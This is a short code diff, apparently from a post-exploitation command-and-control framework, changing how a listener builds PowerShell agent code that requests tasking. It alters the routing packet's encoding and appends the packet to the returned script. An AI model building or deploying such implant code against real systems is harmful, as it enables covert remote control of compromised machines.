@@ -760,7 +760,7 @@ class Listener(object):
                 # ==== BUILD ROUTING PACKET ====
                 # meta 'TASKING_REQUEST' : 4
                 getTask += "$RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;"
-                getTask += "$RoutingPacket = [Convert]::ToBase64String($RoutingPacket);"
+                getTask += "$RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);"
                 getTask += profile.get.client.metadata.generate_powershell("$RoutingPacket")
 
                 # ==== BUILD REQUEST ====
@@ -905,7 +905,7 @@ class Listener(object):
                 sendMessage += "}"
                 sendMessage += "};"
 
-                return updateServers + getTask + sendMessage + "\n'New agent comms registered!'"
+                return updateServers + getTask + sendMessage + "\n'New agent comms registered!'" + "\n $routingpacket;"
 
             elif language.lower() == 'python':
                 # Python
